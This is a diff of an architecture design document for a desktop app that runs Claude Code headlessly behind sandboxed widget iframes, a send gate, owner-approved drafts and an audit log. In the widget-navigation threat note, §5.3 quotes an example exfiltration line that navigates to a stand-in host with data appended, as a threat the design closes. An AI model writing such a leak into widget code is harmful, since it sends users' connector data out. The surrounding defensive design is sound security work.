@@ -1,33 +1,30 @@
 # rlxapp architecture
 
-Status: draft for the owner's review, 2026-11-25. This is the target design; the Tauri skeleton and CI are built in parallel, and nothing here depends on their code.
+Status: draft for the owner's review, 2026-11-25. It describes the target design and doesn't depend on the skeleton and CI being built in parallel.
 
-Conventions:
-- **(E*n*)** and **(R*n*)** cite the [evidence log](#16-evidence-log): commands run against Claude Code 2.1.332 and rlx 0.10.1.
-- rlx file:line links are permalinks to rlx commit `c6b523c3`.
-- **Unconfirmed** marks anything not yet checked.
+Conventions: **(E*n*)** and **(R*n*)** cite the [evidence log](#17-evidence-log) (Claude Code 2.1.332, rlx 0.10.1); rlx file:line links are permalinks to commit `c6b523c3`; **unconfirmed** marks anything not yet checked.
 
 ## 1. Goals and budgets
 
-rlxapp is a desktop app for people who don't use a terminal: GTM teams, team leads, working professionals. It runs rlx and Claude Code in the background and shows the results as widget dashboards. Developers keep the rlx TUI.
+rlxapp is a desktop app for people who don't use a terminal (GTM teams, team leads, working professionals). It runs rlx and Claude Code in the background and shows results as widget dashboards; developers keep the rlx TUI.
 
 **Stack: Tauri 2, a Rust core and a web UI in the system webview** (owner decision, 2026-11-25, chosen over GPUI).
-- **Discord, the visual reference.** On 2026-11-04 Discord announced a Rust rewrite of its desktop client on GPUI, dropping Electron. It keeps the system webview only for embedded content such as YouTube and Activities ([InfoQ](https://infoq.com/news/2026/11/discord-rust-rewrite-gpui-zed), [Inven Global](https://www.invenglobal.com/articles/28182/discord-cto-confirms-the-desktop-and-mobile-apps-are-being-rebuilt-in-rust)).
-- **Why a webview for us.** Our agent-made HTML widgets are exactly that kind of embedded content, and they are the app's core, so a pure-Rust UI would still need a webview for most of the screen.
+- **Discord, the visual reference.** Discord's CTO said on X (2026-11-04) that its desktop client is moving from Electron to Rust on GPUI, keeping a webview only for embedded content (YouTube, Activities). Discord has made no announcement of its own; both sources report those posts ([InfoQ](https://infoq.com/news/2026/11/discord-rust-rewrite-gpui-zed), [Inven Global](https://www.invenglobal.com/articles/28182/discord-cto-confirms-the-desktop-and-mobile-apps-are-being-rebuilt-in-rust)).
+- **Why a webview for us.** Agent-made HTML widgets are that kind of embedded content and the app's core, so a pure-Rust UI would still need a webview for most of the screen.
 
 | Budget | Target | How it is measured |
 |---|---|---|
-| Installer | ≤ 25 MB | A CI job checks the size of each release artifact (`.dmg`, `.exe`, `.AppImage`/`.deb`) and fails any that is over. |
-| Idle RAM | ≤ 150 MB | Release build on Apple silicon, default dashboard on cached data, 60 s after launch, no run in flight. Physical footprint (`footprint`/`ps`) of the app plus its WebKit helpers; engine processes reported separately. |
-| Cold start | ≤ 1.5 s | From process spawn to the first dashboard paint (`performance.mark`). Median of 5 launches after a full quit, on Apple silicon. |
+| Installer | ≤ 25 MB | CI fails any release artifact (`.dmg`, `.exe`, `.AppImage`/`.deb`) over the limit. |
+| Idle RAM | ≤ 150 MB | Release build on Apple silicon, cached default dashboard, 60 s after launch, no run in flight: `footprint` of the app plus WebKit helpers; rlxd reported separately. |
+| Cold start | ≤ 1.5 s | Process spawn to first dashboard paint (`performance.mark`), median of 5 launches after a full quit, Apple silicon. |
 
-Known risk: WebKitGTK on Linux. CI tests it from the first commit.
+Known risk: WebKitGTK on Linux, tested in CI from the first commit.
 
 ## 2. Process model
 
 ```mermaid
 flowchart TB
-  subgraph APP["rlxapp: one app process plus webview helpers"]
+  subgraph APP["Tauri 2 shell: the rlxapp process plus webview helpers"]
     UI["Web UI: React and TS in the system webview"]
     WID["Widget iframes: sandbox allow-scripts, opaque origin"]
     subgraph CORE["Rust core"]
@@ -37,15 +34,15 @@ flowchart TB
       GATE["Send gate and approvals"]
       STO[("Storage: SQLite and files")]
       ENG["Engine interface"]
-      FAKE["FakeEngine: scripted and replayed events"]
+      FAKE["FakeEngine: scripted, replayed"]
     end
   end
-  subgraph RLX["rlx, Python"]
-    RUN["Headless runner, no tmux: rlx 0.10.3"]
-    FLEET["Fleet, board, panes, TUI: Developer mode"]
+  subgraph RLX["rlx 0.10.3"]
+    RLXD["rlxd, Rust daemon: headless runs, PTY host, user scheduler, event push"]
+    PY["rlx Python: orchestration, fleet, board, TUI for Developer mode"]
   end
   CC["Claude Code headless: claude -p, stream-json"]
-  CCI["Claude Code interactive, in tmux panes"]
+  CCI["Claude Code interactive, in rlxd PTYs"]
   CLOUD["Anthropic and claude.ai: model, MCP connectors"]
 
   UI -->|"commands"| BUS
@@ -56,19 +53,19 @@ flowchart TB
   BUS --- STO
   SCH --> ENG
   ENG -.->|"until rlx 0.10.3"| FAKE
-  ENG --> RUN
-  ENG --> FLEET
-  SUP -->|"spawn, watch, kill"| RLX
-  RUN --> CC
-  FLEET --> CCI
+  ENG -->|"rlxd library crate"| RLXD
+  SUP -->|"start, watch, restart"| RLXD
+  PY --- RLXD
+  RLXD --> CC
+  RLXD --> CCI
   CC --> CLOUD
   CCI --> CLOUD
-  CC -->|"tool permission requests, ask F"| GATE
+  RLXD -->|"tool permission requests, ask F"| GATE
 ```
 
-- **Web UI** is first-party; **widget iframes** are untrusted and talk only to the UI (§5.3).
-- **Process supervisor.** Starts and restarts engine processes, and kills whole trees (process groups on Unix, Job Objects on Windows).
-- **Engine interface.** The single boundary to everything agentic. By the owner's decision, all agentic work goes through rlx; the core never spawns `claude` (§13).
+- **Tauri 2 shell.** The web UI is first-party; widget iframes are untrusted and talk only to the UI (§5.3).
+- **Process supervisor.** Starts, watches and restarts rlxd, and stops the app's rlx processes around upgrades (§11); rlxd owns run process trees.
+- **Engine interface.** The only boundary to agentic work, all of which goes through rlx (§14); the core never spawns `claude`.
 
 ```rust
 #[async_trait]
@@ -81,70 +78,57 @@ pub trait Engine: Send + Sync {
     async fn cancel(&self, run: &RunId) -> Result<()>;
 }
 pub struct RunRequest {
-    pub kind: RunKind,              // Task | WidgetRefresh | Watch | Check | SendExecutor | WidgetAuthor | ParseInstruction
+    pub kind: RunKind,       // Task | WidgetRefresh | Watch | Check | SendExecutor | WidgetAuthor | ParseInstruction
     pub prompt: String,
-    pub allowed_tools: Vec<String>, // empty = no tools
+    pub allowed_tools: Vec<String>,     // empty = no tools
+    pub needs_connectors: Vec<String>,  // must be "connected" in system/init (§4)
     pub output_schema: Option<serde_json::Value>,
-    pub session_id: Uuid,           // chosen by the core, for resume
-    pub gate: Arc<dyn ToolGate>,    // decides every write-classified tool call
+    pub session_id: Uuid,               // chosen by the core, for resume
+    pub gate: Arc<dyn ToolGate>,        // decides every write-classified call
 }
 ```
 
-`FakeEngine` (scripted scenarios and recorded stream-json replay) drives the shell, widgets and tests now. `RlxEngine` follows rlx 0.10.3. No direct-Claude engine ships.
-
-`RunEvent` maps the stream-json events seen in E6: `system/init` → `Started`, `assistant` → `Text`/`ToolCall`, `rate_limit_event` → `RateLimited`, `result` → `Finished`. The tool-result event is unconfirmed.
+`FakeEngine` (scripted scenarios, recorded stream-json replay) drives the shell and tests now; `RlxEngine`, on rlxd's crate, follows rlx 0.10.3. `RunEvent` maps stream-json (E6): `system/init` → `Started` with connector states, `assistant` → `Text`/`ToolCall`, `rate_limit_event` → `RateLimited`, `result` → `Finished` (tool results unconfirmed).
 
 ## 3. Auth and Claude sign-in without a terminal
 
-Claude Code is the only auth; the app has no accounts or tokens of its own.
-- **Identity.** `claude auth status --json` reports `loggedIn`, `authMethod: "claude.ai"` and `subscriptionType` (E3, E4).
-- **Detection.** `Engine.status()`; `RlxEngine` reads `rlx --json accounts list` (R3). The app pins the rlx version until that output has a `schema_version` (ask A).
-- **No AISquare login.** rlx's own `rlx login` is AISquare's sign-in (R2) and never appears in the app.
+Claude Code is the only auth; the app has no accounts or tokens. `claude auth status --json` reports `loggedIn`, `authMethod: "claude.ai"` and `subscriptionType` (E3, E4); `RlxEngine.status()` reads `rlx --json accounts list` (R3), version-pinned until it has a `schema_version` (ask A). AISquare's own `rlx login` (R2) never appears in the app.
 
-**Signing in without a terminal.** Onboarding shows **Sign in with Claude**. `Engine.sign_in()` streams `open_url` (the app opens the system browser), then `waiting`, then `signed_in` or `error`.
-- **rlx today.** `rlx accounts add` refuses `--json` and needs a TTY ([accounts.py:1197-1210](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/accounts.py#L1197-L1210)).
-- **Claude Code.** `claude auth login` defaults to `--claudeai` (E3). Whether it completes without a TTY is unconfirmed.
-- **Ask G.** A non-TTY sign-in that emits these steps as JSON lines.
-- **Last resort.** A hidden pseudo-terminal that surfaces only the URL.
-- **Unconfirmed (ask E).** Whether the macOS Keychain read prompts when a GUI app triggers it.
+**Sign-in without a terminal.** **Sign in with Claude** calls `Engine.sign_in()`, streaming `open_url` (opened in the system browser), `waiting`, then `signed_in` or `error`.
+- `rlx accounts add` refuses `--json` and needs a TTY ([accounts.py:1197-1210](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/accounts.py#L1197-L1210)). Ask G: a non-TTY sign-in emitting these steps as JSON lines.
+- `claude auth login` defaults to `--claudeai` (E3); whether it completes without a TTY is unconfirmed. Last resort: a hidden pseudo-terminal that surfaces only the URL.
 
-**Never pass `--bare`.** It never reads OAuth or the keychain (E2), which breaks the claude.ai login.
+**Keychain (ask E, answered from rlx's code).** rlx reads Claude Code's login via `/usr/bin/security` ([claude_accounts.py:1069](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1069)), already on the item's access list, so a GUI app triggers no prompt; only a locked Keychain shows its unlock dialog (rlx waits 5 s, [:1071](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1071)). The app never reads the item itself (it isn't on the list, and a re-signed update can void "Always Allow"). It passes `CLAUDE_CONFIG_DIR` and `CLAUDE_SECURESTORAGE_CONFIG_DIR` to rlx from a login shell (`$SHELL -lc`): the item name is hashed from them ([:1139](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/core/claude_accounts.py#L1139)), and a Finder-launched app lacks shell-profile variables.
 
-**The app's own model calls** (checks, widget authoring, triage) are ordinary engine runs on the user's plan. Usage comes from `rlx --json accounts list --usage` (R3).
+**Never pass `--bare`:** it skips OAuth and the keychain (E2). The app's own model calls are engine runs on the user's plan; usage comes from `rlx --json accounts list --usage` (R3).
 
 ## 4. Connectors
 
-Slack, Gmail and the others are claude.ai MCP connectors on the user's account. Claude Code mounts them under a claude.ai login, and the app never holds their credentials.
+Slack, Gmail and others are claude.ai MCP connectors on the user's account, mounted by Claude Code under a claude.ai login; the app never holds their credentials.
 
-**Verified: headless runs load them (E6).** The probe was `claude -p` with `--output-format stream-json --verbose --tools "" --setting-sources project`, run from an empty directory, so no local MCP configuration was involved. In `system/init`:
-- `mcp_servers` listed `claude.ai <Connector>` servers as `connected`;
-- there were 67 tools named `mcp__claude_ai_<Connector>__<tool>`;
-- `apiKeySource` was `"none"`.
+**Headless runs load them, with a race (E6, E9).** From an empty directory with `--setting-sources project`, `system/init` lists `claude.ai <Connector>` servers (`mcp_servers`), their `mcp__claude_ai_<Connector>__<tool>` tools and `apiKeySource: "none"`, but only what has connected by then:
+- stdin left open: both connectors `connected`, 67 tools (E6); or one `connected`, one `pending`, 8 tools (E9);
+- stdin closed (`</dev/null`): `mcp_servers: []`, no connector tools (E9).
 
-Unconfirmed: a successful headless tool call (none was made, by rule), and listing connectors without a model turn (ask H).
+Unconfirmed: whether a `pending` connector becomes usable mid-run, and headless tool calls (none made, by rule).
 
-**Path.** UI → core → `Engine` → rlx connector surface → Claude Code → claude.ai. Today `rlx --json connectors list` prints `{"error":"not_implemented",…}` and exits 70 (R4). The command is a hidden stub ([app.py:249](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/app.py#L249), [connectors.py:8-25](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/services/connectors.py#L8-L25)).
+**So a run confirms its connectors.** If `system/init` lacks a `connected` entry for any of `needs_connectors`, the core cancels and retries with backoff (3 tries), then marks it `needs-auth` or `failed`. An unconfirmed run's output is discarded: a widget never shows an empty "nothing needs you", only its last good data, marked stale. Ask J moves this into rlxd.
 
-**Connect and repair.** **Connect Slack** opens claude.ai's connector settings (URL unconfirmed). `claude mcp login <name>` covers "claude.ai connector" servers (E5), a re-auth candidate through rlx; its non-TTY behaviour is unconfirmed.
+**Path:** core → `Engine` → rlx → Claude Code → claude.ai. Today `rlx --json connectors list` is a hidden stub exiting 70 (R4, [app.py:249](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/cli/app.py#L249), [connectors.py:8-25](https://github.com/AISquare-Studio/rlx/blob/c6b523c3/src/aisquare/services/connectors.py#L8-L25)). **Connect Slack** opens claude.ai's connector settings (URL unconfirmed); `claude mcp login <name>` (E5) is a re-auth candidate, non-TTY behaviour unconfirmed.
 
 ```ts
 interface Connector {
-  id: string;                                  // "claude.ai Slack"
+  id: string;
   status: "connected" | "needs-auth" | "pending" | "failed";
   tools: { name: string; access: "read" | "write" | "unknown" }[];
 }
 ```
 
-**Access is data, not code.** The first source that answers wins:
-1. MCP `readOnlyHint`, if exposed (ask H).
-2. A shipped table for known connectors.
-3. Name heuristics (`get`, `list`, `search`, `read`).
-
-`write` and `unknown` tools go through the send gate (§8).
+**Access is data, not code:** MCP `readOnlyHint` if exposed (ask H), else a shipped table, else name heuristics (`get`, `list`, `search`, `read`). `write` and `unknown` tools go through the send gate (§8).
 
 ## 5. Widget runtime
 
-**Build once, extend automatically.** A widget is a manifest, one self-contained HTML file and an optional data job. The core runs the data job through the engine and passes validated JSON to the widget, which only renders it. Connectors plug in through data jobs, never through per-service UI code.
+**Build once, extend automatically.** A widget is a manifest, one self-contained HTML file and an optional data job; the core runs the job through the engine and hands the widget validated JSON to render. Connectors plug in through data jobs, never per-service UI code.
 
 ### 5.1 Manifest
 
@@ -155,7 +139,7 @@ type WidgetManifest = {
   version: number;             // bumped on every change; old versions kept
   title: string;
   source: "builtin" | "agent" | "user";
-  size: { w: 1 | 2 | 3 | 4; h: 1 | 2 | 3 | 4 };
+  size: { w: number; h: number };    // grid cells, 1–4
   entry: "index.html";         // one file, ≤ 512 KB, inline JS/CSS
   data?: DataJob;              // absent for clock/timer/pomodoro
   actions: ("openUrl" | "notify" | "draftSend" | "refresh")[];
@@ -165,14 +149,10 @@ type DataJob = {
   connector: string;           // "claude.ai Slack"
   tools: string[];             // read tools only
   prompt: string;              // template: {{settings.*}} {{state.cursor}} {{owner}}
-  output: JSONSchema;          // run output schema; validated again by the core
+  output: JSONSchema;          // run output schema; the core validates again
   every: { minutes: number } | { cron: string };
   runWhen: "app-open" | "background";
 };
-const slackDigest: WidgetManifest = { schemaVersion: 1, id: "slack-digest", version: 1,
-  title: "Slack: needs you", source: "builtin", size: { w: 2, h: 3 }, entry: "index.html",
-  actions: ["openUrl", "draftSend"], data: { connector: "claude.ai Slack", tools: ["<read tools>"],
-  prompt: "…", output: { $ref: "feed.v1.json" }, every: { minutes: 15 }, runWhen: "background" } };
 ```
 
 ### 5.2 Data contract
@@ -185,52 +165,57 @@ type ToWidget =   // core → widget
 type FromWidget = // widget → core
   | { type: "ready" | "refresh"; v: 1 }
   | { type: "setState"; v: 1; state: object }       // ≤ 64 KB, persisted
-  | { type: "openUrl"; v: 1; url: string }          // https only, system browser
-  | { type: "notify"; v: 1; title: string; body: string; at?: string } // fired by the core
+  | { type: "openUrl"; v: 1; url: string }          // after a click; only URLs in the current data
+  | { type: "notify"; v: 1; title: string; body: string; at?: string }
   | { type: "draftSend"; v: 1; connector: string; destination: string; body: string } // ALWAYS a Draft
   | { type: "resize"; v: 1; h: number };
 ```
 
-Invalid data never reaches the widget (it keeps its last good data and shows `error`). Widgets can't call tools, read other widgets or reach the network, and undeclared actions are dropped.
+Invalid data never reaches the widget (it keeps its last good data and shows `error`); widgets can't call tools or read other widgets, and undeclared actions are dropped.
 
 ### 5.3 Rendering: sandboxed iframe, CSP, bridge
 
-- **The iframe.** `<iframe sandbox="allow-scripts">` with **no `allow-same-origin`**, and no popups, top navigation or forms. The opaque origin means no cookies or storage, and no access to the parent DOM or the Tauri IPC.
-- **Serving.** The core serves the document over a custom scheme (`rlxwidget://<id>/<version>`), so the CSP is a response header the widget can't remove. The same policy is also injected as the first `<meta>`:
+- **The iframe.** `<iframe sandbox="allow-scripts">`, **no `allow-same-origin`**, no popups, top navigation or forms. The opaque origin has no cookies or storage and no access to the parent DOM or Tauri IPC.
+- **Serving.** A custom scheme (`rlxwidget://<id>/<version>`) serves the document with the CSP as a response header the widget can't remove, also injected as the first `<meta>`:
   `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'`
-- **Images** from connectors arrive as data URLs fetched by the core.
-- **The bridge.** On load, the UI posts `init` plus one `MessageChannel` port to `iframe.contentWindow` (target `"*"`, since the origin is opaque); all later traffic uses that port. The UI accepts only `event.source === iframe.contentWindow`, validates and rate-limits every message (20/s), and the core re-validates actions.
-- **Skeleton tests** on WKWebView, WebView2 and WebKitGTK: `__TAURI_INTERNALS__` is undefined in the iframe, the scheme's CSP header is enforced, and `fetch` is blocked. Agent-made widgets stay off on any platform that fails.
+  Connector images arrive as data URLs fetched by the core.
+- **Navigation.** CSP has no `navigate-to`, so a widget could leak data by navigating itself (`location.href = "https://x/?" + data`). The host denies subframe navigation off `rlxwidget://` (WKWebView navigation policy, WebView2 `FrameNavigationStarting`, WebKitGTK `decide-policy`); whether Tauri 2's `on_navigation` sees subframes is unconfirmed.
+- **The bridge.** On load the UI posts `init` and a `MessageChannel` port to `iframe.contentWindow` (target `"*"`, as the origin is opaque); traffic then uses the port. The UI accepts only messages whose `event.source === iframe.contentWindow`, validating and rate-limiting them (20/s); the core re-validates actions.
+- **Skeleton tests** on all three webviews: no `__TAURI_INTERNALS__` in the iframe, the CSP header enforced, and `fetch`, self-navigation and `RTCPeerConnection` to a local listener all blocked. Until they pass, "no network" is unconfirmed, and agent-made widgets stay off where they fail.
 
 ### 5.4 Agent-made widgets: create, store, update
 
-- **Create.** The owner asks ("a widget with my open PRs"), or the agent suggests one. A tool-less `WidgetAuthor` run, given the SDK reference, the manifest schema and the read tools, must return `{manifest, html}` through `--json-schema` (E2). The core checks the schema, read-only tools, the size and that there are no external URLs, previews the widget with one dry-run refresh, and the owner clicks **Add**.
+- **Create.** The owner asks ("a widget with my open PRs") or the agent suggests one. A tool-less `WidgetAuthor` run (SDK reference, manifest schema, read tools) returns `{manifest, html}` via `--json-schema` (E2). The core checks schema, read-only tools, size and no external URLs, previews a dry-run refresh, and the owner clicks **Add**.
 - **Store.** `widgets/<id>/<version>/{manifest.json,index.html}` plus a SQLite registry row. Built-ins are read-only; **Customize** copies one.
-- **Update.** "Only show DMs" produces a new version, which is previewed, applied with one click, and can be rolled back. A change that adds tools is shown as a diff first. After three validation failures in a row, the widget offers **Fix with &lt;AgentName&gt;**.
+- **Update.** "Only show DMs" makes a new version: previewed, one-click apply, reversible; added tools show as a diff. After three validation failures in a row the widget offers **Fix with &lt;AgentName&gt;**.
 
 ### 5.5 A new connector gets a widget with zero new code
 
-When `Engine.connectors()` reports an unseen connector, the core creates a `generic-connector` instance from a built-in template. The template fills in the connector, its read tools and a generic prompt ("up to 10 recent items that matter to {{owner}}; set needsYou when …"). One schema and one renderer serve every connector:
+A new connector in `Engine.connectors()` gets a `generic-connector` instance from a template: the connector, its read tools and a generic prompt ("up to 10 recent items that matter to {{owner}}; set needsYou when …"). One schema and renderer serve all:
 
 ```ts
 type Feed = { summary: string; items: { title: string; subtitle?: string; time?: string;
               url?: string; needsYou: boolean; why?: string }[] };   // schemas/feed.v1.json
 ```
 
-No Rust or TS change is needed per connector. **Make it better** hands the instance to §5.4.
+No Rust or TS change per connector; **Make it better** hands it to §5.4.
 
 ### 5.6 First widgets
 
-| Widget | Data job | Highlights | Actions |
+Owner decisions, 2026-11-25:
+
+| Widget | Data job | Shows | Actions |
 |---|---|---|---|
-| Slack digest | Every N min (default 15), incremental via `state.cursor` | `needsYou` (DMs, mentions, threads waiting on the owner) first; the rest summarized | Open; **Draft reply** |
-| Gmail dashboard | Every 15 min | Unread, awaiting reply, from people the owner writes to | Open; **Draft reply** |
-| Clock, timer, pomodoro | None (local) | — | `notify {at}`: the core fires alarms even if the widget is unloaded |
-| Generic per connector | §5.5 | `needsYou` | Open; Draft |
+| Slack digest | Every 15 min (adjustable); incremental via `state.cursor` | The agent judges intent: in the owner's channels it flags questions and requests aimed at them, @mention or not; the rest is summarized | Open; **Draft reply** |
+| Gmail dashboard | Every 15 min; digest daily | Five sections, one `Feed` each: needs a reply (with a drafted reply), important unread, key senders (owner-chosen), a daily digest with drafted replies, today's meetings (owner question 7) | Open; **Review draft** |
+| Clock, timer, pomodoro | None | — | `notify {at}`, fired by the core even if the widget is unloaded |
+| Generic | §5.5 | `needsYou` | Open; Draft |
+
+Drafted replies are Drafts (§8).
 
 ## 6. Scheduler and long-running tasks
 
-Job kinds: `Task`, `WidgetRefresh`, `Watch` (an approval trigger), `Check`, `SendExecutor`, `WidgetAuthor` and `ParseInstruction`. All are engine runs.
+Jobs are the `RunKind`s (§2), all engine runs; a `Watch` evaluates an approval trigger.
 
 ```mermaid
 stateDiagram-v2
@@ -245,18 +230,16 @@ stateDiagram-v2
   needs_you --> failed: cancelled or expired
 ```
 
-- **needs-you.** A draft awaits approval, the agent asked a question (a task's final output follows `{status, summary, question?}`), a connector needs re-auth, or a tool was denied. The tray badge and OS notifications count these runs.
-- **Streaming.** `RunEvent`s go to the run's transcript and the event bus. Runs on screen get partial text (`--include-partial-messages`, E2, through rlx).
-- **Concurrency.** At most 2 tasks. Refreshes run one at a time and coalesce. `RateLimited` makes everything back off, and refreshes pause above a plan-usage threshold.
-- **Cancel.** `Engine.cancel()` kills the run's process tree. The run becomes `failed {reason: "cancelled"}` and keeps its partial output.
-- **Resume after restart.** Runs store their session ID: Claude Code has `--session-id` and `--resume` (E2), and rlx passing them through is ask I. On launch, interrupted tasks resume and refreshes rerun, but **an interrupted `SendExecutor` is never retried**: it becomes needs-you ("this may have sent; check first").
-- **Background.** Closing the window hides it; the core keeps running from the menubar or tray, with a badge. **Quit** stops everything; launch at login is opt-in. Background jobs run while the app or tray is alive. Once rlx's scheduler ships (gap 4), the core registers jobs there so they run with the app closed, and mirrors their states.
+- **needs-you:** a draft awaits approval, the agent asked a question (a task's final output is `{status, summary, question?}`), a connector failed its init check (§4), or a tool was denied; the tray badge and notifications count them.
+- **Streaming:** `RunEvent`s go to the transcript and the event bus; runs on screen get partial text (`--include-partial-messages`, E2).
+- **Concurrency:** at most 2 tasks; refreshes run singly and coalesce; `RateLimited` backs everything off; refreshes pause above a plan-usage threshold.
+- **Cancel:** `Engine.cancel()` has rlxd kill the run's process tree; the run becomes `failed {reason: "cancelled"}`, keeping partial output.
+- **Resume:** runs store a session ID (`--session-id`, `--resume`, E2; ask I). On launch, interrupted tasks resume and refreshes rerun, but **an interrupted `SendExecutor` is never retried**: it goes to needs-you ("this may have sent; check first").
+- **Background:** closing the window keeps the app in the menu bar or tray, with a badge and **Quit**; launch at login is opt-in. Once rlxd's scheduler ships, jobs register there so they can run with the app quit (hub question 2).
 
 ## 7. Personal agent and sign-off
 
-Onboarding asks for the agent's name (any, 1–32 characters) and the owner's display name. Both go into each run's `--append-system-prompt` (E2, through rlx).
-
-The URL lives in one constant, exposed to the UI by a command. A CI grep fails the build if the URL appears anywhere else:
+Onboarding asks for the agent's name (any, 1–32 characters) and the owner's display name; both go into each run's `--append-system-prompt` (E2). The URL lives in one constant, exposed to the UI by a command; a CI grep fails the build if it appears anywhere else:
 
 ```rust
 pub const APP_HOMEPAGE_URL: &str = "https://github.com/AISquare-Studio/rlxapp"; // until a homepage exists
@@ -268,30 +251,24 @@ The core renders the sign-off; the model never writes it. With agent "Nova" and 
 |---|---|
 | Slack mrkdwn | `— Nova, Alex's <https://github.com/AISquare-Studio/rlxapp\|AI Agent>` |
 | Gmail HTML part | `<p>— Nova, Alex's <a href="https://github.com/AISquare-Studio/rlxapp">AI Agent</a></p>` |
-| Gmail plain-text part | `— Nova, Alex's AI Agent (https://github.com/AISquare-Studio/rlxapp)` |
-| Markdown connectors | `— Nova, Alex's [AI Agent](https://github.com/AISquare-Studio/rlxapp)` |
 
-- **Escaping.** Names are escaped per target: Slack's `&<>` become entities, and HTML gets entity escaping. Multipart email gets the sign-off in both parts.
-- **Enforcement.** The send gate requires the body to end with the exact sign-off. Without it, the call becomes a Draft with the sign-off appended.
-- **Body fields.** A per-connector data table maps the body fields. The claude.ai Gmail tool fields are unconfirmed.
+Plain-text parts put the URL in parentheses. Names are escaped per target, and multipart email gets the sign-off in both parts. The gate requires the body to end with the exact sign-off, else the call becomes a Draft with it appended.
 
 ## 8. Send safety
 
 ### 8.1 One gate, one path
 
-**The gate.** Every `write` or `unknown` tool call (§4) reaches the core's send gate before it executes. This needs rlx's runner to forward permission requests (ask F); Claude Code offers `--permission-prompts host` and `--settings` hooks (E2), protocol details unconfirmed. An unreachable gate means deny. The gate decides, not the model.
+**The gate.** Every `write` or `unknown` tool call (§4) reaches the core's send gate first. That needs rlxd to forward permission requests (ask F); Claude Code offers `--permission-prompts host` and `--settings` hooks (E2), protocol unconfirmed. An unreachable gate means deny.
 
-**One path.** Every send becomes a **Draft**: connector, tool, destination, body with sign-off, thread. The original call is denied with "saved as draft; do not retry". The mode decides who approves it:
+**One path.** Every send becomes a **Draft** (connector, tool, destination, body with sign-off, thread), and the original call is denied with "saved as draft; do not retry". The mode decides who approves it:
 
 | Mode | Approved by | Notes |
 |---|---|---|
 | **Draft** (default) | The owner: Approve, Edit or Discard | Every connector starts here |
 | **Standing approval** | A confirmed approval plus the send-time check (§8.3) | Any mismatch or doubt leaves a Draft |
-| **Auto** (opt-in per connector) | A 10 s hold with **Undo** | Labelled risky, enabled by typed confirmation, rate-limited (10/hour/connector by default), logged |
+| **Auto** (opt-in per connector) | A 10 s hold with **Undo** | Labelled risky, typed confirmation, 10/hour/connector by default, logged |
 
-**Sending an approved Draft.** A `SendExecutor` run whose only tool is the draft's tool gets the exact payload. The gate allows only a call whose input hash equals the approved payload's; a mismatch is denied, retried once, then goes to needs-you.
-
-**Undo.** The Auto hold covers every connector. After a send, Activity offers **Delete** where a delete tool exists (Slack's is unconfirmed).
+**Sending.** A `SendExecutor` run, holding only the draft's tool, gets the exact payload; the gate allows only a call whose input hash matches, else denies, retries once, then raises needs-you. **Undo:** the Auto hold, and afterwards **Delete** where a delete tool exists (Slack's is unconfirmed).
 
 ### 8.2 Standing approvals: data model
 
@@ -300,192 +277,177 @@ type StandingApproval = {
   id: string;                         // "apr_…", minted only by the core
   status: "proposed" | "active" | "used" | "revoked" | "expired";
   confirmedAt?: string;               // set only by the owner's click
-  instruction: { text: string; composerInputId: string };   // the owner's own words
-  connector: string;                  // "claude.ai Slack"
-  tools: string[];                    // write tools covered
+  instruction: { text: string; composerInputId: string };
+  connector: string;
+  tools: string[];
   destination: { id: string; label: string };   // exact ID + "#dev"; no wildcards
   trigger: { kind: "now" } | { kind: "schedule"; cron: string }
-         | { kind: "condition"; description: string; watch: DataJob };  // output { met: boolean }
+         | { kind: "condition"; description: string; watch: DataJob;
+             match: { path: string; equals: string }[] };  // metadata, compared in code; [] = text-based
   content: { description: string; maxChars: number; allowBroadcast: false };
   expiry: { kind: "once" } | { kind: "untilRevoked" };
 };
 ```
 
-**Lifecycle.** The owner types "when CI is green, post in #dev asking for approval". A tool-less `ParseInstruction` run, seeing only that text, proposes the fields. The app shows a card (*"Nova will post in #dev when CI on main is green: a message asking for approval to deploy. Once."*), and **Confirm** makes it `active`. Edits revoke and re-propose; `once` approvals become `used` after their send. The Approvals tab lists and revokes them.
+**Lifecycle.** The owner types "when CI is green, post in #dev asking for approval". A tool-less `ParseInstruction` run, seeing only that text, proposes the fields as a card (*"Nova will post in #dev when CI on main is green, asking for approval to deploy. Once."*); **Confirm** activates it. Edits revoke and re-propose; `once` approvals become `used` after sending. The Approvals tab lists and revokes them.
 
 ### 8.3 Send-time check
 
-1. **Code checks.** The approval is active and unexpired, and the run is bound to it. The connector, tool, destination ID and recipients match exactly. The body is within `maxChars`, has no broadcast mention, and carries the sign-off.
-2. **Model check.** A `Check` run with no tools, no session persistence and `--json-schema` (E2) returns `{verdict: "match" | "mismatch" | "unsure", reason}`. Its input is the approval's description, the instruction and the outgoing body, quoted as data. It never sees what the composing run read from Slack or Gmail.
-3. **Decision.** The message is sent only if every code check passes and the verdict is `match`. Anything else, errors and timeouts included, leaves a Draft with the reason.
+1. **Code checks:** the approval is active, unexpired and bound to the run; connector, tool, destination ID and recipients match exactly; the body is within `maxChars`, has no broadcast mention and carries the sign-off.
+2. **Model check:** a tool-less, session-less `Check` run returns `{verdict, reason}` (`match`, `mismatch` or `unsure`) via `--json-schema` (E2), seeing only the approval's description, the instruction and the outgoing body, quoted as data.
+3. **Decision:** send only if every code check passes and the verdict is `match`; anything else, errors and timeouts included, leaves a Draft with the reason.
 
 ### 8.4 Audit log
 
-An append-only, hash-chained `audit` table (each row stores `prev_hash`). It is shown in Activity, exportable as JSONL, and never leaves the machine.
-- **Each row:** seq, time, actor (owner, run, approval or `auto`), event, connector, destination, body hash, verdict and reasons, result (message ID or permalink).
-- **Events:** `draft.*`, `approval.*` (proposed, confirmed, revoked, used, expired), `check.*`, `send.*` (held, sent, failed, undone) and `mode.changed`.
